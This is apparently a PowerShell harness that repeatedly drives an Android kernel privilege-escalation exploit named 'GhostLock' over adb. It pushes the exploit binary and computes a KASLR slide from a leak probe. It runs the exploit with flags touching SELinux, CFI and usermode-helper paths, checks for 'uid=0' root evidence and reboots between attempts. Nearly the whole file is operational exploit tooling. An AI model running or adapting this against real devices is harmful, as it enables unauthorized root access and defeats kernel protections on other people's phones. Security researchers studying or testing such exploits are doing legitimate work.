# e2e retry loop for GhostLock hướng B (safe: no bootloader/flash, configfs+UMH only)
$ErrorActionPreference = 'Continue'
$adb = 'E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe'
$bin = 'E:\Library\Desktop\ghostlock\ghostlockB8_a64'
$log = 'E:\Library\Desktop\ghostlock\_dn_e2e.log'

function L($m) { $m | Out-File -FilePath $log -Append -Encoding utf8; Write-Output $m }

"=== e2e start $(Get-Date) ===" | Out-File -FilePath $log -Encoding utf8
$max = 8
$success = $false
for ($att = 1; $att -le $max; $att++) {
  L ""
  L "----- attempt $att / $max -----"
  # make sure the device is reachable
  & $adb wait-for-device *> $null
  for ($i = 0; $i -lt 90; $i++) {
    $bc = (& $adb shell getprop sys.boot_completed 2>$null) -join ''
    if ($bc.Trim() -eq '1') { break }
    Start-Sleep -Seconds 5
  }
  L "boot_completed=1, settling 120s"
  Start-Sleep -Seconds 120
  & $adb push $bin /data/local/tmp/ghostlockB8 *> $null
  & $adb shell "chmod 755 /data/local/tmp/ghostlockB8; cp -f /data/local/tmp/ghostlockB8 /data/local/tmp/a/e; chmod 755 /data/local/tmp/a/e; rm -f /data/local/tmp/.ghostlock_root.log /data/local/tmp/.ghostlock_ksu.status" *> $null

  # slide probe
  $sp = (& $adb shell "cd /data/local/tmp && timeout 40 ./slideprobe > sp_e2e.log 2>&1; grep -a -m1 bd4 sp_e2e.log" 2>$null) -join "`n"
  L "probe: $($sp -replace "`n",' ; ')"
  if ($sp -match '([0-9a-f]{16})') {
    $low = $matches[1].Substring(8)
    $slide = [uint32]([Convert]::ToUInt32($low, 16)) - 0x8000000 - 0x3bd4
  } else {
    L "no slide parsed; rebooting"
    & $adb reboot *> $null; Start-Sleep -Seconds 20; continue
  }
  $slideHex = '0x{0:x}' -f $slide
  L "slide=$slideHex"

  # run
  $cmd = "cd /data/local/tmp && rm -f glE2E.log; nohup sh -c 'ONLY_FOPS=1 SKIP_CRED=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 SLIDE=$slideHex timeout 60 ./ghostlockB8 > glE2E.log 2>&1' >/dev/null 2>&1 & echo STARTED"
  & $adb shell $cmd *> $null
  Start-Sleep -Seconds 45

  $res = (& $adb shell "grep -a -e 'umh: result' -e 'umh: post' -e 'kernel exec failed' -e 'ONLY_FOPS' -e 'selinux write ok' -e 'cfi FAIL' /data/local/tmp/glE2E.log 2>/dev/null" 2>$null) -join ' || '
  L "result: $res"
  $root = (& $adb shell "cat /data/local/tmp/.ghostlock_root.log 2>/dev/null" 2>$null) -join ' || '
  L "rootlog: $root"
  $uid = (& $adb shell "ls -laZ /data/local/tmp/.ghostlock_root.log 2>/dev/null" 2>$null) -join ''
  L "rootfile: $uid"

  if ($root -match 'uid=0') { L "*** ROOT EVIDENCE (uid=0) on attempt $att ***"; $success = $true; break }

  L "no root; rebooting to clear state"
  & $adb reboot *> $null
  Start-Sleep -Seconds 25
}
L "=== e2e done success=$success $(Get-Date) ==="
